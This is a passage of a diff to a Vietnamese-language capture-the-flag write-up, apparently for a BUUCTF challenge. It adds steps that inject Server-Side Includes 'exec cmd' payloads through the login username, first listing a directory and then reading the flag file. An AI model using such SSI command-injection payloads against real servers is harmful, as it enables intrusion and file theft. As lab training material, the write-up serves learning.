@@ -82,5 +82,16 @@ Nó in ra tên username ta dùng để đăng nhập.Khi ta đăng nhập thì u
 https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
 
 Giở chỉ cần đồi username thành payload tấn công, mỗi username thì file shtml sẽ khác nhau
+```
+<!--#exec cmd="ls ../" -->
+```
+![image](https://github.com/Llam-a/BUUCTF/assets/115911041/4a451269-23da-4d33-942f-477869c48db4)
 
+Có tên flag rồi bây giờ lấy flag thôi
+
+```
+<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2" -->
+```
+
+![image](https://github.com/Llam-a/BUUCTF/assets/115911041/2bf48e8d-8c9d-410a-a39e-0759e3608582)
 
